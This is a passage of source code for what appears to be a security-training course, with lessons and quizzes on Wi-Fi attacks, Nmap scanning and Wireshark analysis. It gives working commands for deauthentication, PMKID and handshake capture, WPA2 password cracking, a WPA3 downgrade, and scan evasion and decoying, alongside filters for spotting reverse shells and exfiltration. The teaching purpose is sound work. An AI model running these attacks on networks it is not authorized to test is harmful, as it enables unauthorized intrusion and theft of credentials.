sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
# -0 = deauthentication, 0 = infinite, -a = target BSSID

# Step 5: Client reconnects automatically, capturing the handshake
# Watch for "WPA handshake: AA:BB:CC:DD:EE:FF" in airodump output
\`\`\`

**Verify the handshake was captured:**
\`\`\`bash
# Check if capture file contains handshake
aircrack-ng capture-01.cap | grep "WPA"

# Or use tshark
tshark -r capture-01.cap -Y "eapol" 2>/dev/null
# EAPOL frames = the 4-way handshake messages
\`\`\`

**Why this matters:**
- The captured handshake can be cracked offline (no network connection needed)
- Tools like aircrack-ng, hashcat, and John the Ripper can crack WPA2 PSK
- WPA3's SAE handshake resists this attack — deauth frames don't help against WPA3`),

    l('wf-7', 'PMKID Attack & WPA3',
      `**PMKID attack:** An alternative to the 4-way handshake that doesn't need a client to be connected.

\`\`\`bash
# Capture PMKID with hcxdumptool
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 capture.pcapng

# Check if we got PMKIDs
cat hash.hc22000
# Line starting with "WPA*02" = PMKID hash
# Line starting with "WPA*01" = 4-way handshake hash
\`\`\`

**WPA3 and SAE:**
WPA3 replaces PSK with SAE (Simultaneous Authentication of Equals), also known as Dragonfly.

\`\`\`bash
# Key differences:
# - WPA2: PSK known to both sides, 4-way handshake can be captured
# - WPA3: SAE uses a password-authenticated key exchange
#         No handshake to capture! Perfect Forward Secrecy

# Check network security type
nmcli dev wifi list | grep -E "WPA2|WPA3"

# WPA3 Transition Mode (WPA2 + WPA3 on same SSID)
# This is vulnerable because you can force the client to use WPA2
\`\`\`

**Attacking WPA3 Transition Mode:**
1. Deploy a rogue AP that only supports WPA2
2. Client falls back to WPA2
3. Capture the WPA2 handshake as normal
4. Crack the password

Always use WPA3-only mode if all your devices support it.`),

    l('wf-8', 'Cracking Wi-Fi Passwords',
      `Once you have a captured handshake or PMKID, crack the password offline.

**Using aircrack-ng (wordlist-based):**
\`\`\`bash
# Crack with a wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Show only the password if found
aircrack-ng -w wordlist.txt -l cracked.txt capture-01.cap
\`\`\`

**Using hashcat (GPU-accelerated):**
\`\`\`bash
# Convert capture to hashcat format
# For .cap files:
aircrack-ng capture-01.cap -j hash
# Output: hash.hccap

# Crack with hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Dictionary + rules (more effective)
hashcat -m 22000 hash.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked password
hashcat -m 22000 hash.hc22000 --show
\`\`\`

**Building a password cracking workflow:**
\`\`\`bash
# 1. Quick check — tiny wordlist first (seconds)
aircrack-ng -w common-passwords.txt capture-01.cap

# 2. RockYou wordlist (minutes to hours)
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# 3. Rule-based with hashcat (more thorough)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# 4. Mask attack (for known patterns)
hashcat -m 22000 hash.hc22000 -a 3 ?u?l?l?l?d?d?d?d?d
# Pattern: Upper + 4 lower + 5 digits (e.g., "Admin12345")
\`\`\`

**Password patterns that crack easily:**
- Common words (password, admin, summer)
- Company name + digits (acmeco01, qyvora2020)
- Seasons + year (summer2020, winter2021)
- Phone numbers, street names

**Realistic expectations:**
- Weak passwords (< 8 chars, dictionary words): cracked in seconds
- Moderate passwords (8-10 chars, mixed): hours to days
- Strong passwords (12+ chars, random): effectively uncrackable
- Router default passwords: often cracked in minutes

Always have written permission before attempting to crack any network.`, { hasQuiz: true, quiz: [
        { id: 'wf-8-q1', question: 'What is the PMKID attack advantage over traditional handshake capture?', options: ['It works on WPA3', 'It doesn\'t need a connected client', 'It\'s faster to crack', 'It works on 5 GHz'], correctIndex: 1, explanation: 'PMKID is sent by the AP during association and can be captured without any connected client.' },
        { id: 'wf-8-q2', question: 'Why does WPA3 resist deauth-based handshake capture?', options: ['It encrypts management frames', 'It uses longer passwords', 'It requires biometric auth', 'It doesn\'t use handshakes'], correctIndex: 0, explanation: 'WPA3 uses Protected Management Frames (PMF), which encrypts deauth/disassoc frames, making deauth attacks ineffective.' },
      ] }),
  ],

  'nmap-101': [
    l('nm-1', 'What is Nmap?',
      `**Nmap** (Network Mapper) is the industry standard for network discovery and security auditing. It sends packets to target hosts and analyzes the responses to determine what's running.

\`\`\`bash
# Check if Nmap is installed
nmap --version

# Install if needed
sudo apt install nmap
\`\`\`

Nmap can discover:
- Which hosts are online
- What ports are open on each host
- What services are running on those ports
- What operating system the host is using
- What firewall rules are in place

**Legal use:**
Only scan systems you own or have explicit permission to test. \`scanme.nmap.org\` is provided by the Nmap project for testing.

\`\`\`bash
# Your first Nmap scan
nmap scanme.nmap.org
\`\`\`

This scans the 1000 most common ports. The results show which ports are open and their associated services.`),

    l('nm-2', 'Basic Scanning',
      `Nmap offers different scan types for different situations.

**Ping sweep** — discover live hosts on a network:

\`\`\`bash
# Find which hosts are online (ICMP echo)
nmap -sn 192.168.1.0/24

# Output:
# Nmap done: 256 IP addresses (5 hosts up)
# 192.168.1.1   → router
# 192.168.1.10  → your machine
# 192.168.1.15  → another device
\`\`\`

The \`-sn\` flag skips port scanning and only checks if hosts are alive.

**TCP SYN scan** (default, requires root):

\`\`\`bash
sudo nmap -sS 192.168.1.1
\`\`\`

This sends a SYN packet, then looks for SYN-ACK responses. An open port responds with SYN-ACK; a closed port responds with RST. It's called a "half-open" scan because it never completes the TCP handshake.

**TCP Connect scan** (no root needed):

\`\`\`bash
nmap -sT 192.168.1.1
\`\`\`

This completes the full TCP handshake. It's slower and more detectable but doesn't require root privileges.

**UDP scan:**

\`\`\`bash
sudo nmap -sU 192.168.1.1
\`\`\`

UDP scans are slower because UDP doesn't have a handshake. Nmap waits for responses or ICMP unreachable messages.`),

    l('nm-3', 'Port Discovery',
      `Nmap gives you fine-grained control over which ports to scan.

\`\`\`bash
# Scan specific ports
nmap -p 22,80,443 scanme.nmap.org

# Scan a range
nmap -p 1-1000 scanme.nmap.org

# Scan all 65535 ports (slow!)
nmap -p- scanme.nmap.org

# Scan most common ports (default: 1000)
nmap --top-ports 100 scanme.nmap.org

# Fast scan (100 most common ports)
nmap -F scanme.nmap.org
\`\`\`

**Port states:**
- **open** — an application is listening on this port
- **closed** — no application listening (port is accessible)
- **filtered** — a firewall or filter is blocking the probe
- **unfiltered** — port is accessible but state unknown
- **open|filtered** — Nmap can't determine if open or filtered

\`\`\`bash
# Scan common web ports across multiple hosts
nmap -p 80,443,8080,8443 192.168.1.0/24

# Scan for database ports
nmap -p 3306,5432,27017,6379 192.168.1.0/24
\`\`\`

Common database ports: 3306 (MySQL), 5432 (PostgreSQL), 27017 (MongoDB), 6379 (Redis). Seeing these exposed is a common security finding.`),

    l('nm-4', 'Service Version Detection',
      `Knowing a port is open is useful. Knowing the exact software version is powerful.

\`\`\`bash
# Service version detection
nmap -sV scanme.nmap.org
\`\`\`

\`\`\`
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 6.6.1p1 Ubuntu
80/tcp   open     http        Apache httpd 2.4.7
443/tcp  open     ssl/http    Apache httpd 2.4.7
\`\`\`

The version tells you:
- The exact software (OpenSSH, Apache, nginx)
- The version number (6.6.1p1, 2.4.7)
- The operating system (Ubuntu)

**Why this matters:**
- Version 6.6.1p1 of OpenSSH might have known vulnerabilities
- Apache 2.4.7 has specific CVEs
- Knowing the OS helps tailor further attacks

\`\`\`bash
# Aggressive version detection (more probes, more accurate)
nmap -sV --version-intensity 9 scanme.nmap.org

# Lightweight version detection (faster, less accurate)
nmap -sV --version-intensity 0 scanme.nmap.org
\`\`\`

The intensity ranges from 0 (light) to 9 (heavy). Default is 7. Higher intensity is more accurate but takes longer and creates more traffic.`),

    l('nm-5', 'OS Fingerprinting',
      `Nmap can identify the operating system of a remote host by analyzing subtle differences in how TCP/IP stacks respond to probes.

\`\`\`bash
# OS detection (requires root)
sudo nmap -O scanme.nmap.org
\`\`\`

\`\`\`
OS details: Linux 2.6.32 - 3.13
Network Distance: 14 hops
\`\`\`

Nmap's OS detection works by sending a series of TCP and UDP packets to open and closed ports, then comparing the responses against a database of known OS fingerprints.

**Combine with version detection for full picture:**

\`\`\`bash
# Aggressive scan: OS + version + scripts + traceroute
sudo nmap -A scanme.nmap.org

# This combines: -O (OS), -sV (version), -sC (default scripts)
# and traceroute
\`\`\`

**Limitations:**
- OS detection is less reliable behind firewalls
- Recent OS versions may not be in Nmap's fingerprint database
- Some systems deliberately obscure their TCP/IP stack
- Load balancers can return mixed results

\`\`\`bash
# Limit OS detection attempts for faster scanning
sudo nmap -O --osscan-limit scanme.nmap.org

# Guess aggressively even with partial data
sudo nmap -O --osscan-guess scanme.nmap.org
\`\`\`

Despite its limitations, OS fingerprinting is remarkably accurate for identifying the general OS family (Windows vs Linux vs macOS).`),

    l('nm-6', 'NSE Scripts',
      `The **Nmap Scripting Engine (NSE)** extends Nmap with automated checks for vulnerabilities, misconfigurations, and more.

\`\`\`bash
# List all available scripts
ls /usr/share/nmap/scripts/
# There are hundreds: http-*, smb-*, ssl-*, dns-*, etc.

# Run default scripts (safe, commonly useful)
nmap -sC scanme.nmap.org

# Run a specific script
nmap --script http-headers scanme.nmap.org

# Run multiple scripts
nmap --script http-title,http-server-header scanme.nmap.org
\`\`\`

**Script categories:**
- **safe** — won't crash services or cause damage
- **intrusive** — might affect the target
- **vuln** — check for specific vulnerabilities
- **exploit** — attempt to exploit vulnerabilities
- **auth** — authentication testing
- **brute** — brute-force attacks
- **discovery** — service and host discovery

\`\`\`bash
# Vulnerability scanning
nmap --script vuln scanme.nmap.org

# HTTP enumeration
nmap --script http-enum scanme.nmap.org

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 scanme.nmap.org

# SMB enumeration (Windows)
nmap --script smb-enum-shares -p 445 192.168.1.1
\`\`\`

**Writing a basic NSE script:**

\`\`\`lua
-- my-script.nse
description = "Check if HTTP title contains 'admin'"
author = "You"
license = "Same as Nmap"

-- Rule: run against port 80
portrule = function(host, port)
    return port.protocol == "tcp" and port.number == 80
end

-- Action: fetch page and check title
action = function(host, port)
    local response = http.get(host, port, "/")
    if response and response.status == 200 then
        if response.body:match("<title>(.-)</title>") then
            return "Page title: " .. response.body:match("<title>(.-)</title>")
        end
    end
end
\`\`\`

Save as \`my-script.nse\` in \`/usr/share/nmap/scripts/\` and run:

\`\`\`bash
nmap --script my-script target.com
\`\`\`

NSE makes Nmap infinitely extensible. The community has written hundreds of scripts covering everything from HTTP to databases to industrial control systems.`, { hasQuiz: true, quiz: [
        { id: 'nm-6-q1', question: 'Which NSE category is safe to run on production systems?', options: ['exploit', 'intrusive', 'safe', 'brute'], correctIndex: 2, explanation: 'The "safe" category contains scripts designed to not crash services or disrupt operations.' },
        { id: 'nm-6-q2', question: 'What language are NSE scripts written in?', options: ['Python', 'Lua', 'Perl', 'JavaScript'], correctIndex: 1, explanation: 'NSE scripts are written in Lua, a lightweight scripting language embedded in Nmap.' },
      ] }),

    l('nm-7', 'Advanced Scan Types',
      `Beyond SYN and TCP connect scans, Nmap supports several specialized scan types.

**TCP FIN, NULL, and XMAS scans (stealth through firewalls):**
\`\`\`bash
# FIN scan — sends packet with only FIN flag set
nmap -sF target.com

# NULL scan — no flags set
nmap -sN target.com

# XMAS scan — FIN, PSH, URG flags set (lights up like a Christmas tree)
nmap -sX target.com
\`\`\`

These work because closed ports respond with RST, but open ports ignore the packet (per RFC 793). They can bypass some stateless firewalls.

**ACK scan — map firewall rules:**
\`\`\`bash
# ACK scan — never identifies open ports, but maps firewall rules
nmap -sA target.com
# Filtered: port is behind a firewall
# Unfiltered: port is reachable (helps with -sW)
\`\`\`

**Window scan:**
\`\`\`bash
# Window scan — uses TCP window size to determine open vs closed
nmap -sW target.com
# Some systems use specific window sizes for open ports
\`\`\`

**Maimon scan:**
\`\`\`bash
# Sends packet with FIN + PSH flags
nmap -sM target.com
# Rarely useful, but works on some BSD-derived systems
\`\`\`

**Scan combinations:**
\`\`\`bash
# Version detection + default scripts + OS detection + traceroute
nmap -A target.com

# All-in-one: SYN scan + version + scripts + OS + traceroute
nmap -sS -sV -sC -O -T4 target.com
\`\`\``),

    l('nm-8', 'Performance & Firewall Evasion',
      `Nmap offers many options to optimize speed and bypass defenses.

**Timing templates (T0-T5):**
\`\`\`bash
# Paranoid (T0) — serializes scans, waits 5 min between probes
nmap -T0 target.com      # IDS evasion, extremely slow

# Sneaky (T1) — 15 seconds between probes
nmap -T1 target.com      # Still evades IDS

# Polite (T2) — 0.4 seconds between probes
nmap -T2 target.com      # Less bandwidth, less IDS attention

# Normal (T3) — default, parallel probes
nmap -T3 target.com      # Default behavior

# Aggressive (T4) — faster, assumes good network
nmap -T4 target.com      # Common for local networks

# Insane (T5) — very fast, may miss open ports
nmap -T5 target.com      # Sacrifices accuracy for speed
\`\`\`

**Evasion techniques:**
\`\`\`bash
# Fragment packets (bypass some packet filters)
nmap -f target.com
nmap --mtu 16 target.com  # Custom fragment size

# Decoy scans (spoof source IPs)
nmap -D 192.168.1.10,10.0.0.1,target.com
# -D decoy1,decoy2,ME — uses your real IP among decoys

# Randomize host and port order
nmap --randomize-hosts target.com
nmap --scan-delay 1s target.com

# Spoof MAC address
nmap --spoof-mac Cisco target.com

# Idle scan (zombie-based, very stealthy)
nmap -sI zombie_host target.com
\`\`\`

**Performance tuning:**
\`\`\`bash
# Increase parallelism
nmap --min-parallelism 50 --max-parallelism 100 target.com

# Adjust timing
nmap --min-rtt-timeout 100ms --max-rtt-timeout 1000ms target.com

# Host group size
nmap --min-hostgroup 64 --max-hostgroup 256 target.com/24

# Retries
nmap --max-retries 1 target.com  # Fewer retries, faster, less accurate
\`\`\`

**Scan specific ports efficiently:**
\`\`\`bash
# Top ports (faster than full scan)
nmap --top-ports 100 target.com

# Speed optimization for large subnets
nmap -sn -T5 --min-parallelism 100 10.0.0.0/8
# -sn = ping sweep only, fast subnet discovery
\`\`\``),

    l('nm-9', 'Output Formats & Automation',
      `Nmap supports multiple output formats for reporting and automation.

**Output formats:**
\`\`\`bash
# Normal output (human-readable)
nmap -oN scan.txt target.com

# XML output (machine-parsable, best for automation)
nmap -oX scan.xml target.com

# Grepable output (for grep/awk)
nmap -oG scan.grep target.com
# grep "22/open" scan.grep  # Find hosts with SSH open

# All formats at once
nmap -oA scan target.com
# Creates scan.nmap, scan.xml, scan.grep
\`\`\`

**Parsing XML output:**
\`\`\`bash
# Using xsltproc to generate HTML reports
xsltproc scan.xml -o scan.html

# Using Python to parse
python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('scan.xml')
for host in tree.findall('.//host'):
    addr = host.find('address').get('addr')
    ports = host.findall('.//port')
    for p in ports:
        print(f'{addr}:{p.get(\"portid\")}/{p.get(\"protocol\")} {p.find(\"state\").get(\"state\")}')
"
\`\`\`

**Automation with bash:**
\`\`\`bash
#!/bin/bash
# auto-scan.sh — scan a list of targets
TARGETS="targets.txt"
OUTDIR="scans/$(date +%Y%m%d-%H%M)"

mkdir -p "$OUTDIR"

while read -r target; do
    echo "Scanning $target..."
    nmap -sS -sV -sC -O -oA "$OUTDIR/$target" "$target"
done < "$TARGETS"

echo "All scans saved to $OUTDIR"
\`\`\`

**Using Ndiff (compare scan results):**
\`\`\`bash
# Compare two scans to see what changed
ndiff scan-before.xml scan-after.xml

# Useful for monitoring (e.g., night vs day scan)
\`\`\`

**Integration with other tools:**
\`\`\`bash
# Feed open ports to other tools
# Get list of HTTP servers
grep "80/open" scan.grep | awk '{print $2}' > http-targets.txt

# Create targets.txt for further scanning
nmap -sV -oG - 192.168.1.0/24 | awk '/open/{print $2}' > live-hosts.txt

# Pipe to nikto (web scanner)
nmap -p80 --open -oG - 192.168.1.0/24 | awk '/80/{print $2}' | while read h; do nikto -h "$h"; done
\`\`\`

Mastering output formats and automation turns Nmap from a one-off scanning tool into the foundation of a complete network reconnaissance pipeline.`, { hasQuiz: true, quiz: [
        { id: 'nm-9-q1', question: 'Which Nmap flag saves output in all formats at once?', options: ['-oN', '-oX', '-oA', '-oG'], correctIndex: 2, explanation: '-oA saves normal, XML, and grepable output simultaneously, creating three files with the given basename.' },
        { id: 'nm-9-q2', question: 'Which Nmap tool compares scan results to show changes?', options: ['ndiff', 'ncat', 'nping', 'nmap-compare'], correctIndex: 0, explanation: 'ndiff compares two Nmap XML output files and highlights differences in open ports and services.' },
      ] }),
  ],

  'wireshark-101': [
    l('ws-1', 'What is Wireshark?',
      `**Wireshark** is the world's most popular network protocol analyzer. It captures packets in real time and displays them in human-readable form.

Think of it as a microscope for your network traffic. Every packet traveling in or out of your computer can be inspected.

\`\`\`bash
# Install Wireshark
sudo apt install wireshark

# Add your user to the wireshark group (to capture without root)
sudo usermod -aG wireshark $USER
# Log out and back in for this to take effect
\`\`\`

**Wireshark's main interface:**
1. **Packet List** — summary of captured packets (time, source, dest, protocol, info)
2. **Packet Details** — decoded protocol information for the selected packet
3. **Packet Bytes** — raw hex and ASCII of the packet

When you first open Wireshark, it shows a list of network interfaces. Choose the one you want to capture from (likely \`eth0\` for wired or \`wlan0\` for Wi-Fi).

\`\`\`bash
# Command-line version for remote/headless capture
tshark -i eth0 -c 100    # Capture 100 packets
\`\`\``),

    l('ws-2', 'Capturing Traffic',
      `**Capturing** is the process of recording network packets as they pass through an interface.

\`\`\`bash
# List available interfaces
tshark -D

# Start capturing on an interface
tshark -i eth0

# Capture with a file output (stop at 1000 packets or 10MB)
tshark -i eth0 -c 1000 -w capture.pcapng

# Read a saved capture
tshark -r capture.pcapng
\`\`\`

In the Wireshark GUI:
1. Click the blue shark fin icon to start capturing
2. Click the red square to stop
3. File → Save to save the capture

**Important concepts:**

**Promiscuous mode** — captured packets not just to/from your machine, but ALL packets the network interface sees. This is how Wireshark sees other devices' traffic on a hub or unswitched network.

**Monitor mode** (Wi-Fi) — captures wireless packets without associating with a network. This allows you to see all Wi-Fi traffic in range.

\`\`\`bash
# Capture in monitor mode (requires special setup)
sudo airmon-ng start wlan0
sudo tshark -i wlan0mon
\`\`\`

**Best practice:** Save your captures (\`.pcapng\` files) so you can analyze them later without needing to re-capture.`),

    l('ws-3', 'Display Filters',
      `In a busy network, thousands of packets fly by every second. **Display filters** let you focus on exactly what you need.

\`\`\`bash
# In Wireshark, type these into the filter bar at the top
# Or use tshark with -Y

# Show only HTTP traffic
http

# Show traffic to/from a specific IP
ip.addr == 192.168.1.1

# Show traffic on a specific port
tcp.port == 443

# Show only DNS queries
dns

# Show only TCP SYN packets
tcp.flags.syn == 1 and tcp.flags.ack == 0

# Combine filters
ip.addr == 10.0.0.1 and http
\`\`\`

\`\`\`bash
# tshark equivalents
tshark -r capture.pcapng -Y "http"
tshark -r capture.pcapng -Y "ip.addr == 192.168.1.1"
\`\`\`

**Useful filter examples:**

\`\`\`
# Exclude broadcast/multicast noise
!broadcast and !multicast

# Find large packets (useful for file transfers)
frame.len > 1000

# Find login credentials (HTTP basic auth)
http.authorization

# Find POST requests with form data
http.request.method == POST

# Find HTTP traffic from a specific host
http.host == example.com

# Find failed SSH logins
ssh.failed_authentication
\`\`\`

Wireshark highlights matching packets in green. The filter expression is evaluated for each packet — if it's true, the packet is shown.`),

    l('ws-4', 'Following Streams',
      `**Following a TCP stream** reconstructs the entire conversation between two hosts. Instead of seeing individual packets, you see the complete data exchange.

In Wireshark GUI:
1. Right-click any packet in a TCP conversation
2. Follow → TCP Stream
3. The entire conversation appears in a new window

\`\`\`bash
# tshark equivalent — extract TCP stream data
tshark -r capture.pcapng -z follow,tcp,ascii,0
# The 0 is the stream index
\`\`\`

**What following a stream reveals:**

\`\`\`http
GET /login HTTP/1.1
Host: example.com
Cookie: session=abc123

HTTP/1.1 200 OK
Content-Type: text/html

<html>
<form action="/login" method="POST">
  <input name="username">
  <input name="password" type="password">
</form>
</html>
\`\`\`

You can reconstruct entire HTTP requests and responses, FTP file transfers, SMTP emails, and more.

**HTTP Stream example:**
\`\`\`http
GET /secret.txt HTTP/1.1
Host: internal-server.local

HTTP/1.1 200 OK
Content-Type: text/plain

FLAG{network_traffic_is_not_private}
\`\`\`

**HTTP/2 streams** work differently — use "Follow → HTTP/2 Stream" instead.

Following streams is how you find passwords, API keys, and sensitive data transmitted in plaintext. If you find HTTPS traffic, it will be encrypted and unreadable (unless you've configured Wireshark with the SSL/TLS keys).`),

    l('ws-5', 'Analyzing HTTP Traffic',
      `HTTP is the most common unencrypted protocol you'll encounter. Here's how to analyze it in Wireshark.

**Identify HTTP traffic:**
\`\`\`
# Filter: show only HTTP requests
http.request

# Show HTTP responses
http.response

# Show a specific request method
http.request.method == GET
http.request.method == POST
\`\`\`

**Inspect a GET request:**
\`\`\`http
GET /products?id=42 HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ==
\`\`\`

The \`Cookie\` header contains a Base64-encoded JSON blob. Decode it:

\`\`\`bash
echo "eyJ1c2VyIjoiYWRtaW4ifQ==" | base64 -d
# {"user":"admin"}
\`\`\`

**Inspect a POST request (login form):**
\`\`\`http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=secret123
\`\`\`

Plaintext credentials in the request body. This is why HTTPS exists.

**Statistic tools in Wireshark:**
- Statistics → HTTP → Requests — see all URLs requested
- Statistics → HTTP → Load Distribution — which servers get the most traffic
- Statistics → Protocol Hierarchy — see which protocols use the most bandwidth

\`\`\`bash
# tshark HTTP analysis
tshark -r capture.pcapng -Y "http.request" -T fields \\
  -e http.host -e http.request.uri -e http.request.method
\`\`\`

This extracts the host, URI, and method from every HTTP request in the capture.`),

    l('ws-6', 'Identifying Malicious Traffic',
      `Wireshark is an essential tool for network forensics. Here are patterns to look for.

**1. Unusual outbound connections:**

\`\`\`bash
# Filter for traffic to suspicious destinations
ip.dst != 192.168.0.0/16 and ip.dst != 10.0.0.0/8 and tcp.port == 4444
\`\`\`

Port 4444 is commonly used by Metasploit reverse shells.

**2. Beaconing (C2 traffic):**
Beaconing is regular, periodic traffic to a command-and-control server.

\`\`\`
# Look for traffic with consistent timing
# Filter by destination IP, then check "Time" column
# Regular intervals (every 60 seconds) = beaconing
\`\`\`

**3. DNS tunneling:**
\`\`\`
# Filter for DNS queries with unusually long hostnames
dns.qry.name.len > 50

# Or base64-encoded subdomains
dns.qry.name matches "^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$"
\`\`\`

**4. Port scanning:**
\`\`\`
# Many SYN packets to different ports from one IP
tcp.flags.syn == 1 and tcp.flags.ack == 0 and !icmp
# Group by destination port — many different ports = scanning
\`\`\`

**5. Large data exfiltration:**
\`\`\`
# Unusually large outbound packets
ip.dst != 192.168.0.0/16 and frame.len > 1500

# Or large DNS responses
dns and dns.len > 200
\`\`\`

**6. ARP spoofing:**
\`\`\`
# Multiple IPs mapping to the same MAC address
arp.duplicate-address-detected
\`\`\`

**Always correlate** suspicious traffic with other evidence. A single strange packet doesn't confirm an attack, but patterns of unusual behavior are worth investigating.

The best way to learn is to practice: download public packet captures from malware-traffic-analysis.net and try to identify the malicious traffic yourself.`, { hasQuiz: true, quiz: [
        { id: 'ws-6-q1', question: 'What does beaconing traffic typically look like in Wireshark?', options: ['Random bursts of packets', 'Regular periodic connections at consistent intervals', 'Large single transfers', 'Encrypted HTTPS traffic'], correctIndex: 1, explanation: 'Beaconing is characterized by regular, periodic connections to a C2 server — often every 60 seconds or at another consistent interval.' },
        { id: 'ws-6-q2', question: 'Which Wireshark filter detects DNS tunneling?', options: ['dns.qry.name.len > 50', 'dns.flags == 1', 'udp.port == 53', 'ip.proto == 17'], correctIndex: 0, explanation: 'DNS tunneling often uses very long subdomains to encode data. Filtering for query names longer than 50 characters is a good starting point.' },
      ] }),

    l('ws-7', 'TShark: Command-Line Wireshark',
      `TShark is the terminal version of Wireshark. It's essential for scripting, remote capture, and automated analysis.

**Basic captures:**
\`\`\`bash
# Capture live (like tcpdump but with Wireshark's protocol parsers)
sudo tshark -i eth0

# Capture with a display filter
sudo tshark -i eth0 -f "port 80"

# Capture N packets then stop
sudo tshark -i eth0 -c 100

# Write to file
sudo tshark -i eth0 -w capture.pcapng

# Read a capture file
tshark -r capture.pcapng
\`\`\`

**Filtering with TShark:**
\`\`\`bash
# Apply display filter (like Wireshark GUI)
tshark -r capture.pcapng -Y "http.request"

# Show specific fields (much cleaner output)
tshark -r capture.pcapng -Y "http" -T fields \
  -e http.host -e http.request.uri -e http.response.code

# CSV output (for spreadsheets/reports)
tshark -r capture.pcapng -T fields -E separator=, \
  -e frame.time -e ip.src -e ip.dst -e tcp.port
\`\`\`

**Statistics and analysis:**
\`\`\`bash
# Protocol hierarchy
tshark -r capture.pcapng -z io,phs

# Top talkers
tshark -r capture.pcapng -z ip_hosts,tree

# HTTP requests summary
tshark -r capture.pcapng -z http,tree

# Endpoints
tshark -r capture.pcapng -z endpoints,ip

# Expert info
tshark -r capture.pcapng -z expert
\`\`\`

**Automated analysis scripts:**
\`\`\`bash
#!/bin/bash
# analyze.sh — quick triage of a pcap
PCAP="$1"

echo "=== Protocol Hierarchy ==="
tshark -r "$PCAP" -z io,phs 2>/dev/null | head -30

echo "=== Top IPs ==="
tshark -r "$PCAP" -z ip_hosts,tree 2>/dev/null | head -20

echo "=== DNS Queries ==="
tshark -r "$PCAP" -Y "dns.flags.response == 0" -T fields \
  -e dns.qry.name 2>/dev/null | sort | uniq -c | sort -rn | head -10

echo "=== HTTP Hosts ==="
tshark -r "$PCAP" -Y "http.request" -T fields \
  -e http.host 2>/dev/null | sort | uniq -c | sort -rn | head -10

echo "=== Suspicious Ports ==="
tshark -r "$PCAP" -T fields -e tcp.dstport 2>/dev/null | \
  sort | uniq -c | sort -rn | head -10
\`\`\``),

    l('ws-8', 'TLS Decryption & Advanced Analysis',
      `Wireshark can decrypt TLS traffic if you have the private key or session keys.

**Using SSLKEYLOGFILE (browser-based):**
\`\`\`bash
# Set environment variable before starting browser
export SSLKEYLOGFILE=/tmp/keys.log
firefox &

# Or chromium
export SSLKEYLOGFILE=/tmp/keys.log
chromium-browser &
\`\`\`

**Configure Wireshark:**
\`\`\`
Edit → Preferences → Protocols → TLS
(R)TLS Keys File: /tmp/keys.log
(Pre)-Master-Secret log filename
\`\`\`

**TShark with key log:**
\`\`\`bash
tshark -r capture.pcapng -o tls.keylog_file:/tmp/keys.log \
  -Y "tls" -T fields -e tls.handshake.type -e tls.handshake.ciphersuite
\`\`\`

**Decrypting with a server private key:**
\`\`\`bash
# Only works for RSA key exchange (not ECDHE — most modern TLS)
# Wireshark: Edit → Preferences → Protocols → TLS → RSA key file
# Format: ip,port,protocol,keyfile
# 10.0.0.1,443,tcp,/path/to/private.key
\`\`\`

**What you can see after decryption:**
\`\`\`bash
# Full HTTP/2 request and response
tshark -r decrypted.pcapng -Y "http2"
# Application data
tshark -r decrypted.pcapng -Y "tls.application_data"
\`\`\`

**VoIP analysis:**
\`\`\`bash
# SIP calls
tshark -r capture.pcapng -Y "sip" -T fields -e sip.from -e sip.to

# RTP streams (play back audio)
tshark -r capture.pcapng -Y "rtp"

# In Wireshark GUI: Telephony → VoIP Calls → Play Streams
\`\`\`

**ICMP analysis for network troubleshooting:**
\`\`\`bash
# Ping requests and responses
tshark -r capture.pcapng -Y "icmp" -T fields \
  -e icmp.type -e icmp.seq -e ip.src -e ip.dst
# Type 0 = echo reply, Type 8 = echo request

# TTL analysis (detect routing loops)
tshark -r capture.pcapng -Y "icmp" -T fields -e ip.ttl
\`\`\``),

    l('ws-9', 'Forensic Analysis & Custom Filters',
      `Advanced Wireshark techniques for deep packet investigation.

**Building complex display filters:**
\`\`\`bash
# Find all HTTP POST requests to /login
http.request.method == POST && http.request.uri contains "/login"

# Find packets with "admin" in the payload
frame contains "admin"

# Find traffic between specific hosts
ip.addr == 192.168.1.100 && tcp.port == 443

# Exclude common noise (broadcast, multicast, DHCP)
!icmp && !arp && !dhcp && !(udp.port == 1900)

# Find retransmissions (network problems)
tcp.analysis.retransmission

# Find zero-window events (receiver can't keep up)
tcp.analysis.zero_window
\`\`\`

**Saving and managing filters:**
\`\`\`
# In Wireshark GUI:
# Capture Filters: Capture → Capture Filters → New
# Display Filters: Analyze → Display Filters → New

# Filter files are stored in:
~/.config/wireshark/dfilters    # Display filters
~/.config/wireshark/cfilters    # Capture filters
\`\`\`

**Using coloring rules for quick triage:**
\`\`\`
# In Wireshark: View → Coloring Rules → New
# Common rules:
# - TCP RST: red background (errors)
# - HTTP 4xx/5xx: yellow background (server issues)
# - DNS: light blue (background traffic)
# - TLS Handshake: green (encrypted session setup)
\`\`\`

**Packet export and carving:**
\`\`\`bash
# Export specific packets
tshark -r capture.pcapng -Y "http.request.uri contains /malware.exe" \
  -w extracted.pcapng

# Follow TCP stream and save raw data
tshark -r capture.pcapng -z follow,tcp,ascii,0

# Export objects (HTTP files, SMB files)
# Wireshark: File → Export Objects → HTTP/SMB/...

# Carve files from pcap with foremost
foremost -t png -i capture.pcapng
\`\`\`

**Full forensic triage workflow:**
\`\`\`bash
#!/bin/bash
# forensic-triage.sh — automate pcap analysis

PCAP="$1"
OUTDIR="forensic-output-$(date +%s)"
mkdir -p "$OUTDIR"

echo "[1/5] Protocol hierarchy"
tshark -r "$PCAP" -z io,phs > "$OUTDIR/protocols.txt"

echo "[2/5] Extract all HTTP objects"
tshark -r "$PCAP" --export-objects "http,$OUTDIR/http-objects"

